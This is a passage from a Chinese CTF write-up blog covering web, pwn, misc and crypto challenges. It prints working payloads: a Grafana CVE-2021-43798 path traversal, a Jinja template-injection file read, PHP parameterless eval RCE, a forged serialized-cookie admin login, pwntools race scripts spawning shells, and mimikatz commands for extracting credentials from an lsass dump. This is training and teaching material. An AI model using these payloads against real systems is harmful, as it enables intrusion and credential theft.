<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/nuaa-format-2.png"></p>
<h2 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h2><p>顶级非预期<br>1111111111131111111311121131114瞎按<br>录了视频<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/thread-1.png"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="真的签到"><a href="#真的签到" class="headerlink" title="真的签到"></a>真的签到</h2><p>百度到<code>CVE-2021-43798</code><br>payload:<code>/public/plugins/welcome/../../../../../../../../home/grafana/flag</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%9C%9F%E7%9A%84%E7%AD%BE%E5%88%B0.png"></p>
<h2 id="baby-python"><a href="#baby-python" class="headerlink" title="baby_python"></a>baby_python</h2><p>前端应该做处理了看不见回显，使用BurpSuite</p>
<p>传入<code>&#123;&#123;self&#125;&#125;</code>，返回模板数据</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2021-12-11%2016-24-54-77.png"></p>
<p>常规了<code>self.__class__.__base__.__subclasses__()</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2021-12-11%2016-25-49-07.png"></p>
<p>查看type类的初始化方法，传入<code>&#123;&#123;self.__class__.__base__.__subclasses__()[0].__init__&#125;&#125;</code>：</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2021-12-11%2016-27-09-89.png"></p>
<p>后面就是常规payload了，跑一下ls有文件名就直接获取了</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;open&#x27;](<span class="hljs-name">&#x27;flllll11111114aaaaaggggggggggggg&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p><a href="https://www.aisoutu.com/a/345834">参考文章</a></p>
<h2 id="Twister"><a href="#Twister" class="headerlink" title="Twister"></a>Twister</h2><p>F12看到一个文件<code>f111444g.php</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/twister-1.png"><br>访问，请求头里直接就是flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/twister-2.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>nuaa</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP无参数RCE</title>
    <url>/wp/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE.html</url>
    <content><![CDATA[<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker!&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>首先看这个正则<code>[^\W]+\((?R)?\)</code></p>
<p>第一部分<code>[^\W]</code>：<br>其中<code>[]</code>表示匹配的开始结束，<code>^</code>表示取反<br><code>\W</code>,(注意这个W是大写的)，匹配非字母、数字、下划线。等价于<code>[^A-Za-z0-9_]</code><br>所以<code>[^\W]</code>是对上面的<code>\w</code>取反: 匹配所有字母数字下划线的字母</p>
<p><code>+</code>是为了拼接表达式</p>
<p>第二部分<code>\((?R)?\)</code>:<br>其中两侧的<code>\(</code>和<code>\)</code>表示匹配括号<br><code>(?R)</code>表示递归表达式本身<br><code>(?R)?</code>,最后的<code>?</code>表示匹配1个或者0个表达式本身，最后的<code>?</code>必不可少的</p>
<p>所以我们的payload必须没有参数</p>
<p>很容易想到通过<code>session</code>和<code>hex2bin</code>函数进行rce，但是这里session被禁用了，但是我们还可以通过传递的参数来进行RCE</p>
<p>在php中有个函数能返回一个包含所有已定义变量列表的多维数组<br>就是<code>get_defined_vars()</code></p>
<p>利用这个函数我们就可以构造如下payload：<br><code>?code=var_dump(get_defined_vars());&amp;a=1</code></p>
<p>会返回<code>array(4) &#123; [&quot;_GET&quot;]=&gt; array(2) &#123; [&quot;code&quot;]=&gt; string(29) &quot;var_dump(get_defined_vars());&quot; [&quot;a&quot;]=&gt; string(1) &quot;1&quot; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; &#125;</code></p>
<p>现在我们需要将<code>[&quot;a&quot;]=&gt; string(1) &quot;1&quot;</code>提取出来</p>
<p>先使用<code>current()</code>函数返回数组中的当前元素的值</p>
<p>在使用<code>end()</code>函数指向最后一个元素即可</p>
<p>最后发现end被过滤了，问题不大，使用<code>array_pop()</code>函数效果是一样的</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%97%A0%E5%8F%82%E6%95%B0rce-1.png"></p>
<p>所以最后的payload为<code>?code=eval(array_pop(current(get_defined_vars())));&amp;a=phpinfo();</code></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>rce</tag>
        <tag>无参数</tag>
      </tags>
  </entry>
  <entry>
    <title>奇安信CTF基础培训题目wp</title>
    <url>/wp/%E5%A5%87%E5%AE%89%E4%BF%A1CTF%E5%9F%BA%E7%A1%80%E5%9F%B9%E8%AE%AD%E9%A2%98%E7%9B%AEwp.html</url>
    <content><![CDATA[<p>第一次当ctf讲师^_^</p>
<p>7.12-7.19 week1<br>7.19-7.26 week2<br>7.26-8.02 week3</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Web-2-hack"><a href="#Web-2-hack" class="headerlink" title="Web-2-hack"></a>Web-2-hack</h2><p>使用<code>dirsearch</code>扫描后台，发现存在<code>shell.php</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-Web-2-hack-1.png"></p>
<p>使用burp等工具抓包爆破密码，得到密码<code>hack</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-Web-2-hack-2.png"></p>
<h2 id="web-3-web82"><a href="#web-3-web82" class="headerlink" title="web-3-web82"></a>web-3-web82</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_error&quot;</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A_A&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A_A&#x27;</span>]:<span class="hljs-string">&#x27;A_A&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>], <span class="hljs-string">&quot;A_A&quot;</span>) !==<span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;A_A,have fun&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$str</span>&lt;<span class="hljs-number">9999999999</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;A_A,too small&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$str</span>&gt;<span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;A_A,too big&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>需要我们传入<code>A_A</code>，但是又不能等于<code>A_A</code>，看似很矛盾，实际上利用了php的一个小特性</p>
<p>在php中，变量名中的<code>+</code> <code>%20</code> <code>.</code> <code>空格</code> <code>[</code>会被替换成下划线，所以当我们传入<code>A.A</code>或<code>A A</code>时，也会被当成<code>A_A</code></p>
<p>然后就是绕过数字，因为在php中会认为数组比数字大，所以传入<code>?A+A[]=</code>即可</p>
<h2 id="vipzone"><a href="#vipzone" class="headerlink" title="vipzone"></a>vipzone</h2><p>首页有个hint，<code>guest:guest 账户已经启用</code>，那就用guest账号登录看一下</p>
<p>发现有两个cookie比较可疑，因为有一个非常明显是base64加密后的值</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-vipzone-1.png"></p>
<p>base64解密后发现是明文的序列化对象</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-vipzone-2.png"></p>
<p>而第二个cookie: <code>check</code>恰恰用这串base64的md5值的base64值来校验</p>
<p>所以我们只需要修改序列化对象然后加密就可以绕过登录了</p>
<p>但是我们不知道admin的密码，这里可以尝试用布尔型代替密码，并赋值为1</p>
<p>修改后的值：<code>O:4:&quot;User&quot;:2:&#123;s:4:&quot;user&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;b:1;&#125;</code><br>base64加密：<code>Tzo0OiJVc2VyIjoyOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO3M6NDoicGFzcyI7YjoxO30=</code><br>md5加密：<code>6897f0060a84ecb0600e4167d2a748e4</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-vipzone-3.png"></p>
<h2 id="web-3-web54"><a href="#web-3-web54" class="headerlink" title="web-3-web54"></a>web-3-web54</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag1.php&quot;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$args</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^\w+$/&quot;</span>,<span class="hljs-variable">$args</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;args error!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump($<span class="hljs-subst">$args</span>);&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>有一个正则匹配<code>/^\w+$/</code></p>
<div class="note note-info">
            <p>两个&#x2F;&#x2F;表示开始和结束<br>^表示开始字符串<br>$表示结束字符串<br>\w表示包含[a-z，A-Z, _ , 0-9]<br>+表示一个或者多个\w</p>
          </div>


<p>然后是一个<code>$$args</code>，也就是说我们传入的参数将会被当作一个变量名并打印它的变量值</p>
<p>传入php超全局变量<code>$GLOBALS</code>即可</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-web-3-web54-1.png"></p>
<h2 id="Web-4-littledropbox"><a href="#Web-4-littledropbox" class="headerlink" title="Web-4-littledropbox"></a>Web-4-littledropbox</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$uploadDir</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$uploadDir</span>)) <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$uploadDir</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>])) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>))) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]), <span class="hljs-string">&#x27;&lt;?&#x27;</span>) !== False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$info</span>[<span class="hljs-number">0</span>] !== <span class="hljs-number">100</span> || <span class="hljs-variable">$info</span>[<span class="hljs-number">1</span>] !== <span class="hljs-number">50</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br>        &#125;<br>    &#125;<br>    @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-variable">$uploadDir</span> . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]));<br>&#125;<br><br><span class="hljs-variable">$ready</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_GET, <span class="hljs-string">&#x27;ready&#x27;</span>);<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_GET, <span class="hljs-string">&#x27;key&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$ready</span> === <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;secretKey&quot;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;secretKey&quot;</span>] = <span class="hljs-title function_ invoke__">mt_rand</span>();<br>    &#125;<br>    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;secretKey&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">225</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-title function_ invoke__">mt_rand</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>() . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> === (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;secretKey&#x27;</span>]) &#123;<br>        <span class="hljs-title function_ invoke__">upload</span>();<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>


<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="race"><a href="#race" class="headerlink" title="race"></a>race</h2><p>ida分析：<br>1：当i大于9，且输入不为1时，会调用<code>system(&quot;/bin/sh&quot;)</code>；<br>2：修改i的值需要调用thread1函数，在这里因为<code>count = 3</code> ，而每次执行<code>thread1</code>函数，都会使<code>count--</code>,<br>在正常的使用中，最多只能执行三次<code>i++</code>，不过因为<code>sleep(0xA)</code>的原因，线程会在验证<code>count</code>的值之后停下，我们可以在这10秒中，调用多次<code>thread1</code>函数，使多个线程卡在<code>++i</code>指令之前，在10秒之后，就会执行多次<code>++i</code>指令，使<code>i&gt;9</code>，这时输入一个非1的数字，程序就会调用<code>system(&quot;/bin/sh&quot;)</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-race-2.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;172.19.1.28&#x27;</span>,<span class="hljs-string">&#x27;10001&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>time.sleep(<span class="hljs-number">0xb</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-race-1.png"></p>
<h2 id="race2"><a href="#race2" class="headerlink" title="race2"></a>race2</h2><p>在<code>file_read</code>函数中，当<code>buf</code>字符串中不存在<code>flag</code>时，会先等待<code>5</code>秒<br>然后打开<code>buf</code>字符串指定的文件，并输出文件内容</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week3-race2-2.png"></p>
<p>但因为程序是使用多线程调用的<code>file_read</code>函数，所以程序在等待<code>5</code>秒时，我们还是可以修改<code>buf</code>字符串的值</p>
<p>最后只需要先让线程执行到<code>sleep(5);</code>代码处，然后再输入<code>flag</code>，然后等待一段时间，程序就会打开靶机上的<code>flag</code>文件，并输出其内容</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week3-race2-3.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>p=remote(<span class="hljs-string">&#x27;172.19.1.132&#x27;</span>,<span class="hljs-number">10002</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;abc&#x27;</span>)<br>time.sleep(<span class="hljs-number">1</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>time.sleep(<span class="hljs-number">5</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week3-race2.png"></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="misc-3-hacker"><a href="#misc-3-hacker" class="headerlink" title="misc-3-hacker"></a>misc-3-hacker</h2><p>下载得到一个<code>lsass.dmp</code>文件，什么是<code>lsass.dmp</code>呢，它是<code>procdump</code>从<code>lsass.exe</code>中导出的凭据，可以用<code>mimikatz</code>读取</p>
<p>把文件放到程序目录下，以管理员运行<code>mimikatz</code>，执行以下命令</p>
<div class="note note-info">
            <p>privilege::debug<br>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonpasswords full</p>
          </div>


<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-misc-3-hacker-1.png"></p>
<p>如果报错<code>ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos-&gt;ProcessorArchitecture (0) != PROCESSOR_ARCHITECTURE_AMD64 (9)</code></p>
<p>那么可能是架构错了，用win32版本重新运行即可</p>
<h2 id="misc-3-funny-ASCII"><a href="#misc-3-funny-ASCII" class="headerlink" title="misc-3-funny ASCII"></a>misc-3-funny ASCII</h2><p>二进制数据转成文本即可</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-misc-3-funny%20ASCII-1.png"></p>
<h2 id="misc-4-password"><a href="#misc-4-password" class="headerlink" title="misc-4-password"></a>misc-4-password</h2><p>打开一看，发现有几个文件很小，只有4</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week2-MISC-4-password-1.png"></p>
<p>一般小于6的文件是可以进行crc爆破的，推荐<a href="https://github.com/theonlypwner/crc32">工具</a></p>
<p>用法：<code>python crc32.py reverse crc</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-week2-MISC-4-password-2.png"></p>
<p>提取出来后转字符串得到<code>easypassword</code>，解压得到flag</p>
<h2 id="misc103"><a href="#misc103" class="headerlink" title="misc103"></a>misc103</h2><p>根据题目描述来看是一道数据恢复题</p>
<p>file命令看下文件<code>badimages: Linux rev 1.0 ext3 filesystem data, UUID=ca014691-c6ea-4a5a-8da4-74a1aa1c9a80</code></p>
<p>可以知道是linux下的ext3文件，linux下的文件恢复可以用<code>extundelete</code>命令</p>
<p>看日志：<code>extundelete &lt;file&gt; --journal</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-misc103-1.png"></p>
<p>尝试恢复所有目录和文件：<code>extundelete &lt;file&gt; --restore-all</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-misc103-2.png"></p>
<p>恢复到<code>RECOVERED_FILES</code>目录</p>
<p>flag在<code>RECOVERED_FILES/Flag.txt</code>中</p>
<h2 id="Misc-5-Forgotten-password"><a href="#Misc-5-Forgotten-password" class="headerlink" title="Misc-5-Forgotten password"></a>Misc-5-Forgotten password</h2><p>取证题</p>
<p>第一步肯定是获取内存镜像的基本信息</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-Misc-5-Forgotten-password-1.png"></p>
<p>根据hint<code>小明总是喜欢password记录下来</code>，用<code>editbox</code>显示出有关编辑控件的信息，得到密码<code>password*&amp;!@wxcq12</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-Misc-5-Forgotten-password-2.png"></p>
<p>用密码直接交不对，那么应该是压缩包之类的密码了<br>查找压缩包并导出</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxinctf-Misc-5-Forgotten-password-3.png"></p>
<p>用<code>editbox</code>得到的密码解压压缩包拿到flag</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Write-a-script"><a href="#Write-a-script" class="headerlink" title="Write a script"></a>Write a script</h2><p>md5爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br>word=<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span><br>r=itertools.product(word,repeat=<span class="hljs-number">3</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r:<br><br>    dec =<span class="hljs-string">&quot;flag&#123;P7%sY0OG%s0XPC%sZPK&#125;&quot;</span>%(i[<span class="hljs-number">0</span>],i[<span class="hljs-number">1</span>],i[<span class="hljs-number">2</span>])<br>    dec=dec.strip()<br>    enc = hashlib.md5()<br>    enc.update(dec.encode())<br>    code=enc.hexdigest()<br>    code=code.strip()<br>    <span class="hljs-keyword">if</span> code[:<span class="hljs-number">4</span>]==<span class="hljs-string">&quot;9e86&quot;</span> <span class="hljs-keyword">and</span> code[-<span class="hljs-number">6</span>:]==<span class="hljs-string">&quot;0ea7cf&quot;</span>:<br>        <span class="hljs-built_in">print</span>(dec)<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/qianxin-Write%20a%20script-1.png"></p>
<h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p>给了一个py文件和明文的md5值</p>
<p>代码中明文base64加密之后将小写字母全部变为大写</p>
<p>使用脚本暴力破解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    m1 = hashlib.md5(<span class="hljs-built_in">str</span>).hexdigest()<br>    <span class="hljs-keyword">if</span> m1 == <span class="hljs-string">&#x27;16478a151bdd41335dcd69b270f6b985&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>list1=itertools.product([<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;f&#x27;</span>],[<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>],[<span class="hljs-string">&#x27;Z&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>],[<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>],[<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>],[<span class="hljs-string">&#x27;0&#x27;</span>],[<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>],[<span class="hljs-string">&#x27;3&#x27;</span>],[<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>],[<span class="hljs-string">&#x27;3&#x27;</span>],[<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>],[<span 